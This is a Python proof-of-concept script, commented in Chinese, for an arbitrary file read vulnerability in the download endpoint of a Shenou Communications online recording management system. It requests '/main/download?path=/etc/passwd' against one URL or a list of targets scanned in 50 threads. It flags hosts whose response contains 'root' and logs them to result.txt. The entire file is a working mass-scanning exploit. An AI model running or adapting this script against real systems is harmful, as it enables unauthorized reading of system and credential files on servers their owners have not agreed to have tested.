#申瓯通信 在线录音管理系统 download 任意文件读取漏洞
import argparse
from multiprocessing.dummy import Pool
import requests
import sys
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

#定义横幅
def banner():
    banner = """

███████╗██╗██╗     ███████╗██████╗ ███████╗ █████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
█████╗  ██║██║     █████╗  ██████╔╝█████╗  ███████║██║  ██║
██╔══╝  ██║██║     ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║  ██║
██║     ██║███████╗███████╗██║  ██║███████╗██║  ██║██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝                      
                                    version:SOTX_LYXT_FileRead
                                    Author: hi6
                                                
"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="申瓯通信 在线录音管理系统 download 任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    # ses = requests.Session()
    payload = "/main/download?path=/etc/passwd"
    url = target + payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", 
        "Accept-Encoding": "gzip, deflate", 
        "Accept": "*/*", 
        "Connection": "keep-alive"
        }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try:
        re = requests.get(url=url,headers=headers,verify=False,proxies=proxies,timeout=5)
        if re.status_code == 200 and 'root' in re.text:
            print(f'{GREEN}[+] {url} 存在任意文件读取漏洞！{RESET}')
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print('不存在该漏洞!!')
    except:
        pass


if __name__ == '__main__':
    main()
